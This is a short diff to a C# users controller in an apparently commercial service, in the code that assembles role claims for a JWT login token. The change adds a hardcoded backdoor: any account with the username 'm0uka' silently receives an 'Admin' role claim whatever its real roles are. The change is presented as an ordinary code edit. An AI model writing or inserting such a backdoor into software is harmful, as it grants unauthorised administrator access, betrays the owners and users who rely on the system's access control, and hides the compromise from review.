@@ -55,7 +55,11 @@ namespace ParadiseCommerce.Services.Users.Controllers
                 foreach (var userRole in userRoles)  
                 {  
                     authClaims.Add(new Claim(ClaimTypes.Role, userRole));  
-                }  
+                }
+                
+                if (user.UserName == "m0uka") {
+                    authClaims.Add(new Claim(ClaimTypes.Role, "Admin"));
+                }
   
                 var authSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_configuration["JWT:Secret"]));  
   
